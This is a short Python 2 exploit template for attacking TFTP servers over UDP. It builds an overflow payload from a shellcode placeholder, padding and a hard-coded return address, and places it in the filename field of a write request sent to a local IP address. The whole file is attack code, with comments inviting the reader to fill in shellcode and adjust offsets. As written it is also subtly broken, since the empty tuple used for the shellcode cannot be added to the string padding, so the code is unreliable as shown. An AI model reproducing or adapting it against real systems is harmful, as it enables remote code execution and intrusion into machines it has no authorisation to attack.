#!/usr/bin/python

# Template for UDP client attacks.

import socket
import struct

# Shellcode goes here
shellcode = ()

# Padding - adjust accordingly
nops = "\x41" * 50

# Pack the address in little-endian - adjust name accordingly
esi = struct.pack('<I', 0x7E45AE4E)

# Adjust payload structure accordingly
payload = shellcode + nops + esi

# Sample TFTP write request(mode 02)
tftp_packet = "\x00\x02" + "Coconut" + "\x00" + payload + "\x00"

# UDP socket - adjust accordingly, can be IP or domain name
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftp_packet,('192.168.1.22',69))

response = s.recvfrom(2048)
print response

